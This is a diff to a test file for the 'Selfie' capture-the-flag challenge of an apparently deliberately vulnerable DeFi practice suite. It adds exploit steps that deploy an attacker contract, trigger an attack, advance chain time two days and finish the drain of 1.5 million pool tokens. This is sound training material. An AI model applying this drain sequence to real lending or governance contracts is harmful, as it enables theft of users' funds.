@@ -21,7 +21,7 @@ describe('[Challenge] Selfie', function () {
             this.token.address,
             this.governance.address    
         );
-
+        // transfer 1.5m / 2m tokens to the pool
         await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
         expect(
@@ -31,6 +31,13 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.
+        
+        const AttackerFactory = await ethers.getContractFactory('SelfiePoolAttacker', deployer);
+        this.attacker = await AttackerFactory.deploy(this.pool.address, this.token.address, this.governance.address);
+        await this.attacker.connect(attacker).attack();
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        await this.attacker.attack2();
     });
 
     after(async function () {
